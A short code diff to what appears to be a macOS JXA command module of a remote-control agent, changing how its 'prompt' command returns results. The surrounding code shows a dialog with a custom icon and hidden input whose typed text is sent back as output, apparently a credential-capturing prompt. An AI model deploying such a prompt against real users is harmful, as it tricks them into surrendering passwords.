@@ -20,9 +20,9 @@ exports.prompt = function(task, command, params){
 			withIcon: Path(icon),
 			hiddenAnswer: true 
 		});
-		return JSON.stringify({"user_output":prompt.textReturned, "completed": true});
+		return {"user_output":prompt.textReturned, "completed": true};
 	}catch(error){
-        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+        return {"user_output":error.toString(), "completed": true, "status": "error"};
 	}
 };
 COMMAND_ENDS_HERE
